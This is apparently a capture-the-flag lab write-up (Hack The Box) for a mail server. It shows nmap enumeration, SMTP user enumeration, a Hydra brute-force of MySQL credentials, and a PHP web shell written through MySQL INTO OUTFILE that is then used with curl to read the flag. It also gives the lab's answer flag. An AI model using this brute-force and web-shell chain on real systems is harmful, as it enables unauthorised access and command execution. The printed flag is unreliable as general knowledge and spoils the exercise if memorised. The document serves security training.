# EASY
We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

`HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

> Task: You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer. **Answer: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}**

1. Enumerate the target:
    ```sh
    $ nmap -Pn -sV 10.129.36.98
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 01:25 CST
    Nmap scan report for 10.129.36.98
    Host is up (0.23s latency).
    Not shown: 993 filtered tcp ports (no-response)
    PORT     STATE SERVICE       VERSION
    21/tcp   open  ftp
    25/tcp   open  smtp          hMailServer smtpd
    80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
    443/tcp  open  ssl/https
    587/tcp  open  smtp          hMailServer smtpd
    3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    ```

2. Since the target is a SMTP server, try to enumerate the users → found user `fiona`:
    ```sh
    $ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.36.98
    Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

    ----------------------------------------------------------
    |                   Scan Information                       |
    ----------------------------------------------------------

    Mode ..................... RCPT
    Worker Processes ......... 5
    Usernames file ........... users.list
    Target count ............. 1
    Username count ........... 79
    Target TCP port .......... 25
    Query timeout ............ 5 secs
    Target domain ............ inlanefreight.htb

    ######## Scan started at Wed Feb 11 01:36:29 2026 #########
    10.129.36.98: fiona@inlanefreight.htb exists
    ######## Scan completed at Wed Feb 11 01:36:47 2026 #########
    1 results.
    ```

3. Try to brute-force the MySQL service with the found username → found credential for DB `fiona:987654321`
    ```sh
    $ hydra -l fiona -P rockyou.txt 10.129.36.121 mysql
    Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 02:41:52
    [INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
    [DATA] attacking mysql://10.129.36.121:3306/
    [3306][mysql] host: 10.129.36.121   login: fiona   password: 987654321
    1 of 1 target successfully completed, 1 valid password found
    ```

4. Since `secure_file_priv` is empty, we can write files via MySQL. Write a PHP backdoor to `C:\xampp\htdocs\backdoor.php`:
    ```sh
    $ mysql -u fiona -p -h 10.129.36.121
    Enter password: 987654321
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 178
    Server version: 10.4.24-MariaDB mariadb.org binary distribution

    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MariaDB [(none)]> show variables like "secure_file_priv";
    +------------------+-------+
    | Variable_name    | Value |
    +------------------+-------+
    | secure_file_priv |       |
    +------------------+-------+
    1 row in set (0.240 sec)

    MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\backdoor.php';
    Query OK, 1 row affected (0.231 sec)
    ```

5. Read the flag via the PHP backdoor at `C:\Users\Administrator\Desktop\flag.txt`
    ```
    $ curl 'http://10.129.36.121/backdoor.php?c=type%20C:\Users\Administrator\Desktop\flag.txt'
    HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
    ```
